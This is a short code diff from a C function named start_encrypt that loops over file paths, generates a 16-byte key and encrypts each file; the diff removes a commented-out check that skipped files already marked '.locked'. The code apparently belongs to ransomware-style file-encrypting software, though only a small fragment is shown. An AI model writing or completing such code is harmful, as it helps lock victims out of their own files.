@@ -16,14 +16,8 @@ void start_encrypt() {
         if (data == NULL){
             break;
         }
-          
-        /*
-        if (strstr(data, ".locked") != NULL) {
-            free(data);
-            continue;
-        }*/
-
-        // printf("TID: %lu: \n%s\n", (unsigned long)pthread_self(), data);
+        
+        //printf("TID: %lu: \n%s\n", (unsigned long)pthread_self(), data);
         unsigned char key[16];
         use_key(key);
         char *filename = encrypt_file(data, key);
